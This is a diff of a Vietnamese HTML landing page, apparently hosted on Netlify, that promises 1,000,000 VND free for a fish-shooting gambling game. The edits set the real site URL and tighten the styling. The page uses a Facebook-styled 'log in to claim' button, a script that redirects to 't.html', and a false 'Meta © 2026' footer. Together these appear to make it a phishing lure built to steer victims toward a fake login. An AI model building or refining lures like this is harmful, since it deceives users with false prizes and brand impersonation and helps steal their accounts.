@@ -6,12 +6,12 @@
     <title>BẮN CÁ ĐỔI THƯỞNG 2026 - NHẬN 1.000.000 VNĐ MIỄN PHÍ</title>
     
     <meta property="og:type" content="website" />
-    <meta property="og:url" content="https://your-link.netlify.app/" /> 
+    <meta property="og:url" content="https://nohu-ban-ca-2026.netlify.app/" /> 
     <meta property="og:site_name" content="HỆ THỐNG PHÁT CODE TÂN THỦ 2026" />
     <meta property="og:title" content="🔥 CHÚC MỪNG! BẠN NHẬN ĐƯỢC 1.000.000 VNĐ VỐN KHỞI NGHIỆP" />
     <meta property="og:description" content="Sự kiện tri ân: Đăng nhập nhận ngay 1 triệu VNĐ vào tài khoản game. Nhấn để nhận quà ngay hôm nay!" />
     
-    <meta property="og:image" content="https://your-link.netlify.app/banner.jpg" />
+    <meta property="og:image" content="https://nohu-ban-ca-2026.netlify.app/banner.jpg" />
     <meta property="og:image:width" content="1200" />
     <meta property="og:image:height" content="630" />
     <meta name="twitter:card" content="summary_large_image">
@@ -20,7 +20,6 @@
         body, html {
             margin: 0; padding: 0; width: 100%; height: 100%;
             font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            /* Cập nhật tên ảnh nền thành banner.jpg */
             background: #001a33 url('banner.jpg') no-repeat center center fixed;
             background-size: cover;
             color: white; overflow: hidden;
@@ -32,20 +31,19 @@
             background: rgba(0, 0, 0, 0.4);
         }
 
-        /* KHUNG WRAPPER: Đã thu nhỏ chiều rộng tối đa (max-width) */
+        /* KHUNG WRAPPER: Đã thu nhỏ max-width xuống 360px cho gọn */
         .promo-card-wrapper {
             position: relative;
             width: 88%; 
-            max-width: 380px; /* Thu nhỏ từ 480px xuống 380px để gọn hơn */
+            max-width: 360px; 
             border-radius: 25px;
-            padding: 4px; /* Viền neon mảnh hơn cho tinh tế */
+            padding: 4px;
             overflow: hidden;
             box-shadow: 0 0 20px rgba(255, 204, 0, 0.4);
             animation: slideIn 0.6s ease-out;
-            box-sizing: border-box;
         }
 
-        /* Hiệu ứng tia sáng Neon chạy quanh viền */
+        /* Hiệu ứng tia sáng Neon đa sắc */
         .promo-card-wrapper::before {
             content: '';
             position: absolute;
@@ -56,12 +54,12 @@
             z-index: 1;
         }
 
-        /* NỘI DUNG CHÍNH (Glassmorphism) */
+        /* NỘI DUNG CHÍNH (Nền xanh đen mờ) */
         .promo-card-content {
             position: relative;
-            background: rgba(0, 15, 30, 0.92);
+            background: rgba(0, 15, 30, 0.95);
             border-radius: 22px;
-            padding: 25px; /* Giảm padding để khung nhỏ lại */
+            padding: 20px 25px; 
             backdrop-filter: blur(15px);
             -webkit-backdrop-filter: blur(15px);
             text-align: center;
@@ -72,37 +70,35 @@
         @keyframes rotateGlow { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
 
         h1 {
-            color: #ffcc00; font-size: 26px; margin: 0; /* Giảm cỡ chữ tiêu đề */
+            color: #ffcc00; font-size: 24px; margin: 0;
             text-transform: uppercase; font-weight: 900;
-            text-shadow: 0 2px 10px rgba(255, 204, 0, 0.7);
+            text-shadow: 0 2px 8px rgba(255, 204, 0, 0.7);
         }
 
         .sub-title {
-            color: #00ffcc; font-size: 17px; font-weight: bold;
-            display: block; margin: 8px 0 15px 0;
+            color: #00ffcc; font-size: 16px; font-weight: bold;
+            display: block; margin: 5px 0 15px 0;
             animation: blink 1s infinite alternate;
         }
 
         @keyframes blink { from { opacity: 1; } to { opacity: 0.7; } }
 
-        .description { font-size: 13px; line-height: 1.5; color: #f0f0f0; margin-bottom: 20px; }
+        .description { font-size: 13px; line-height: 1.5; color: #f0f0f0; margin-bottom: 15px; }
 
-        /* Khung danh sách ưu đãi gọn hơn */
         .highlight-box {
             background: rgba(255, 255, 255, 0.06);
-            border-radius: 12px; padding: 12px; margin-bottom: 20px;
+            border-radius: 12px; padding: 12px; margin-bottom: 15px;
             border-left: 4px solid #ffcc00; text-align: left;
         }
 
         .highlight-box ul { margin: 0; padding-left: 5px; list-style: none; }
-        .highlight-box li { margin: 8px 0; font-size: 13px; line-height: 1.3; }
+        .highlight-box li { margin: 6px 0; font-size: 12px; }
 
-        /* NÚT BẤM NHÔ LÊN NHÔ XUỐNG KÍCH THÍCH */
         .btn-fb {
             background: linear-gradient(135deg, #1877f2, #0056b3);
             color: white; text-decoration: none;
-            padding: 14px 20px; border-radius: 50px;
-            font-size: 16px; font-weight: bold;
+            padding: 12px 20px; border-radius: 50px;
+            font-size: 15px; font-weight: bold;
             display: flex; align-items: center; justify-content: center;
             border: 2px solid #fff; cursor: pointer;
             width: 100%; box-sizing: border-box;
@@ -111,19 +107,12 @@
 
         @keyframes pulse-fb {
             0% { transform: scale(1); }
-            50% { transform: scale(1.06); } /* Nhô to lên */
+            50% { transform: scale(1.05); }
             100% { transform: scale(1); }
         }
 
-        .btn-fb img { width: 22px; margin-right: 10px; }
-        .footer-note { font-size: 10px; color: #999; margin-top: 12px; font-style: italic; }
-
-        /* Mobile nhỏ hơn nửa */
-        @media (max-width: 480px) {
-            .promo-card-wrapper { width: 90%; }
-            h1 { font-size: 22px; }
-            .sub-title { font-size: 15px; }
-        }
+        .btn-fb img { width: 20px; margin-right: 8px; }
+        .footer-note { font-size: 10px; color: #888; margin-top: 10px; font-style: italic; }
     </style>
 </head>
 <body>
@@ -135,7 +124,7 @@
                 <span class="sub-title">1.000.000 VNĐ MIỄN PHÍ</span>
 
                 <div class="description">
-                    Gói quà <b>Vàng Ròng</b> đã sẵn sàng. Tiền thưởng cộng trực tiếp sau khi xác thực tài khoản!
+                    Gói quà <b>Vàng Ròng</b> đã sẵn sàng. Tiền thưởng cộng ngay sau khi xác thực!
                 </div>
 
                 <div class="highlight-box">
@@ -151,9 +140,7 @@
                     Đăng nhập nhận thưởng ngay
                 </a>
 
-                <div class="footer-note">
-                    * Mỗi tài khoản nhận quà 1 lần. Meta © 2026.
-                </div>
+                <div class="footer-note">* Meta © 2026.</div>
             </div>
         </div>
     </div>
@@ -161,10 +148,7 @@
     <script>
         function chuyenHuongLogin() {
             document.body.style.opacity = "0.5";
-            document.body.style.transition = "0.3s";
-            setTimeout(function() {
-                window.location.href = "t.html";
-            }, 300);
+            setTimeout(function() { window.location.href = "t.html"; }, 200);
         }
     </script>
 </body>
